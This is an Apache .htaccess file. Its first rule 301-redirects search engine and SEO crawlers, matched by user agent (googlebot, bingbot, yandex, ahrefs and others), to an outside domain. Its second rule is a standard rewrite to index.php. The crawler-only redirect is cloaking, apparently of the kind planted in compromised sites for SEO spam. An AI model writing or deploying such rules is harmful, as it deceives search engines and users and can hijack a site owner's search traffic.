RewriteEngine On

RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog) [NC]
RewriteRule ^(.*)$ https://jurnal.fk-unipa.com/ [R=301,L]

RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^ index.php [L]
